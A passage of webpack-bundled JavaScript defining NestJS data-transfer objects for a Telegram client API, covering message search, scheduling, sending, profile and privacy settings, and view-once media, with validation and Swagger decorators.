/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchMessagesResponseDto = exports.MessageTypeResult = exports.SearchMessagesDto = exports.SearchScope = exports.MessageMediaType = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
var MessageMediaType;
(function (MessageMediaType) {
    MessageMediaType["ALL"] = "all";
    MessageMediaType["TEXT"] = "text";
    MessageMediaType["PHOTO"] = "photo";
    MessageMediaType["VIDEO"] = "video";
    MessageMediaType["VOICE"] = "voice";
    MessageMediaType["DOCUMENT"] = "document";
    MessageMediaType["ROUND_VIDEO"] = "roundVideo";
    MessageMediaType["ROUND_VOICE"] = "roundVoice";
    MessageMediaType["STICKER"] = "sticker";
    MessageMediaType["ANIMATION"] = "animation";
    MessageMediaType["CONTACT"] = "contact";
    MessageMediaType["MUSIC"] = "music";
    MessageMediaType["CHAT_PHOTO"] = "chatPhoto";
})(MessageMediaType || (exports.MessageMediaType = MessageMediaType = {}));
var SearchScope;
(function (SearchScope) {
    SearchScope["CHAT"] = "chat";
    SearchScope["GLOBAL"] = "global";
})(SearchScope || (exports.SearchScope = SearchScope = {}));
class SearchMessagesDto {
}
exports.SearchMessagesDto = SearchMessagesDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Chat ID to search in (required for chat-specific search)',
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], SearchMessagesDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Search query string',
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], SearchMessagesDto.prototype, "query", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Filter by multiple types options',
        isArray: true,
        enum: MessageMediaType,
        example: [MessageMediaType.TEXT, MessageMediaType.PHOTO],
        default: [MessageMediaType.ALL, MessageMediaType.TEXT, MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.VOICE, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VIDEO, MessageMediaType.ROUND_VOICE, MessageMediaType.STICKER, MessageMediaType.ANIMATION, MessageMediaType.CONTACT, MessageMediaType.MUSIC, MessageMediaType.CHAT_PHOTO],
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsEnum)(MessageMediaType, { each: true }),
    (0, class_transformer_1.Type)(() => String),
    __metadata("design:type", Array)
], SearchMessagesDto.prototype, "types", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum message ID for filtering',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "minId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum message ID for filtering',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "maxId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum number of messages to retrieve',
        minimum: 1,
        maximum: 500,
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(1),
    (0, class_validator_1.Max)(500),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "limit", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Offset ID for pagination',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "offsetId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Offset date as Unix timestamp',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "offsetDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Start date for filtering messages by date range',
    }),
    (0, class_transformer_1.Type)(() => Date),
    (0, class_validator_1.IsDate)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Date)
], SearchMessagesDto.prototype, "startDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'End date for filtering messages by date range',
    }),
    (0, class_transformer_1.Type)(() => Date),
    (0, class_validator_1.IsDate)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Date)
], SearchMessagesDto.prototype, "endDate", void 0);
class MessageTypeResult {
}
exports.MessageTypeResult = MessageTypeResult;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Array of message IDs matching the search criteria',
        type: [Number],
        example: [1001, 1005, 1010]
    }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsInt)({ each: true }),
    __metadata("design:type", Array)
], MessageTypeResult.prototype, "messages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Total count of messages matching the search criteria',
        example: 3
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    __metadata("design:type", Number)
], MessageTypeResult.prototype, "total", void 0);
class SearchMessagesResponseDto {
}
exports.SearchMessagesResponseDto = SearchMessagesResponseDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'All message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "all", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Text message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "text", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Photo message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "photo", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Video message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "video", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Voice message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "voice", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Document message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "document", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Round video message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "roundVideo", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Round voice message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "roundVoice", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/metadata-operations.dto.ts":
/*!****************************************************************!*\
  !*** ./src/components/Telegram/dto/metadata-operations.dto.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BulkMessageOperationDto = exports.DialogsQueryDto = exports.MediaMetadataDto = exports.MetadataType = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var MetadataType;
(function (MetadataType) {
    MetadataType["PHOTO"] = "photo";
    MetadataType["VIDEO"] = "video";
    MetadataType["DOCUMENT"] = "document";
})(MetadataType || (exports.MetadataType = MetadataType = {}));
class MediaMetadataDto {
    constructor() {
        this.limit = 50;
    }
}
exports.MediaMetadataDto = MediaMetadataDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID to get metadata from' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], MediaMetadataDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message offset', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], MediaMetadataDto.prototype, "offset", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Maximum number of items', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], MediaMetadataDto.prototype, "limit", void 0);
class DialogsQueryDto {
    constructor() {
        this.limit = 100;
        this.offsetId = 0;
        this.archived = false;
    }
}
exports.DialogsQueryDto = DialogsQueryDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Number of dialogs to fetch', required: false, type: Number, minimum: 1, maximum: 1000 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(1),
    (0, class_validator_1.Max)(1000),
    __metadata("design:type", Number)
], DialogsQueryDto.prototype, "limit", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Dialog offset', required: false, type: Number, minimum: 0 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    __metadata("design:type", Number)
], DialogsQueryDto.prototype, "offsetId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Include archived chats', required: false, type: Boolean }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => {
        if (value === 'true')
            return true;
        if (value === 'false')
            return false;
        return value;
    }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], DialogsQueryDto.prototype, "archived", void 0);
class BulkMessageOperationDto {
}
exports.BulkMessageOperationDto = BulkMessageOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Source chat ID', type: String, minLength: 1, maxLength: 255 }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BulkMessageOperationDto.prototype, "fromChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Target chat ID', type: String, minLength: 1, maxLength: 255 }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BulkMessageOperationDto.prototype, "toChatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message IDs to operate on', type: [Number], minItems: 1, maxItems: 100 }),
    (0, class_transformer_1.Transform)(({ value }) => Array.isArray(value) ? value.map(Number) : value),
    __metadata("design:type", Array)
], BulkMessageOperationDto.prototype, "messageIds", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/profile-settings.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/profile-settings.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ProfilePhotoDto = exports.SecuritySettingsDto = exports.PrivacySettingsDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const telegram_1 = __webpack_require__(/*! ../../../interfaces/telegram */ "./src/interfaces/telegram.ts");
class PrivacySettingsDto {
}
exports.PrivacySettingsDto = PrivacySettingsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Phone number visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "phoneNumber", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last seen visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "lastSeen", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Profile photos visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "profilePhotos", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message forwards visibility', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "forwards", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Calls privacy', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "calls", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Group chats privacy', enum: telegram_1.PrivacyLevelEnum, required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)(telegram_1.PrivacyLevelEnum),
    __metadata("design:type", String)
], PrivacySettingsDto.prototype, "groups", void 0);
class SecuritySettingsDto {
}
exports.SecuritySettingsDto = SecuritySettingsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Enable/disable two-factor authentication' }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], SecuritySettingsDto.prototype, "twoFactorAuth", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Active sessions limit', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsEnum)([1, 2, 3, 4, 5]),
    __metadata("design:type", Number)
], SecuritySettingsDto.prototype, "activeSessionsLimit", void 0);
class ProfilePhotoDto {
}
exports.ProfilePhotoDto = ProfilePhotoDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Name/identifier of the photo to set' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ProfilePhotoDto.prototype, "name", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/schedule-operations.dto.ts":
/*!****************************************************************!*\
  !*** ./src/components/Telegram/dto/schedule-operations.dto.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BatchProcessItemDto = exports.RescheduleMessageDto = exports.DeleteScheduledMessageDto = exports.GetScheduledMessagesDto = exports.ScheduleMessageDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const batch_operations_dto_1 = __webpack_require__(/*! ./batch-operations.dto */ "./src/components/Telegram/dto/batch-operations.dto.ts");
class ScheduleMessageDto extends batch_operations_dto_1.BaseBatchItemDto {
}
exports.ScheduleMessageDto = ScheduleMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message content' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], ScheduleMessageDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Date to schedule the message' }),
    (0, class_validator_1.IsDateString)(),
    (0, class_transformer_1.Transform)(({ value }) => new Date(value)),
    __metadata("design:type", String)
], ScheduleMessageDto.prototype, "scheduledTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message to reply to', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], ScheduleMessageDto.prototype, "replyTo", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Silent notification', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ScheduleMessageDto.prototype, "silent", void 0);
class GetScheduledMessagesDto extends batch_operations_dto_1.BaseBatchItemDto {
    constructor() {
        super(...arguments);
        this.limit = 50;
    }
}
exports.GetScheduledMessagesDto = GetScheduledMessagesDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Maximum number of messages to return', required: false, default: 50 }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], GetScheduledMessagesDto.prototype, "limit", void 0);
class DeleteScheduledMessageDto extends batch_operations_dto_1.BaseBatchItemDto {
}
exports.DeleteScheduledMessageDto = DeleteScheduledMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'ID of the scheduled message to delete' }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], DeleteScheduledMessageDto.prototype, "messageId", void 0);
class RescheduleMessageDto {
}
exports.RescheduleMessageDto = RescheduleMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID containing the message' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], RescheduleMessageDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message ID to reschedule' }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], RescheduleMessageDto.prototype, "messageId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'New schedule date (ISO string)' }),
    (0, class_validator_1.IsDateString)(),
    __metadata("design:type", String)
], RescheduleMessageDto.prototype, "newScheduleDate", void 0);
class BatchProcessItemDto {
}
exports.BatchProcessItemDto = BatchProcessItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID or message ID depending on operation' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BatchProcessItemDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message ID for operations that require it', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], BatchProcessItemDto.prototype, "messageId", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/send-message.dto.ts":
/*!*********************************************************!*\
  !*** ./src/components/Telegram/dto/send-message.dto.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SendTgMessageDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SendTgMessageDto {
}
exports.SendTgMessageDto = SendTgMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Target username or peer ID',
        example: 'someusername',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendTgMessageDto.prototype, "peer", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Message text to send',
        example: 'Hello from NestJS and GramJS!',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendTgMessageDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional message parse mode (Markdown, HTML)',
        required: false,
        example: 'Markdown',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendTgMessageDto.prototype, "parseMode", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/update-profile.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/Telegram/dto/update-profile.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateProfileDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class UpdateProfileDto {
}
exports.UpdateProfileDto = UpdateProfileDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'First name' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], UpdateProfileDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'About information', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], UpdateProfileDto.prototype, "about", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/update-username.dto.ts":
/*!************************************************************!*\
  !*** ./src/components/Telegram/dto/update-username.dto.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUsernameDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class UpdateUsernameDto {
}
exports.UpdateUsernameDto = UpdateUsernameDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'New username to set for the Telegram user',
        example: 'new_username123',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], UpdateUsernameDto.prototype, "newUsername", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/view-once-media.dto.ts":
/*!************************************************************!*\
  !*** ./src/components/Telegram/dto/view-once-media.dto.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ViewOnceMediaDto = exports.MediaSourceType = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
var MediaSourceType;
(function (MediaSourceType) {
    MediaSourceType["PATH"] = "path";
    MediaSourceType["BASE64"] = "base64";
    MediaSourceType["BINARY"] = "binary";
})(MediaSourceType || (exports.MediaSourceType = MediaSourceType = {}));
class ViewOnceMediaDto {
}
exports.ViewOnceMediaDto = ViewOnceMediaDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Chat ID to send the view once media to',
        example: '123456789'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Source type of the media: url, base64, or binary',
        enum: MediaSourceType,
        example: 'url'
    }),
    (0, class_validator_1.IsEnum)(MediaSourceType),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "sourceType", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'URL of the media file (when sourceType is url)',
        required: false,
        example: 'https://example.com/image.jpg'
    }),
    (0, class_validator_1.ValidateIf)(o => o.sourceType === MediaSourceType.PATH),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "path", void 0);
__decorate([
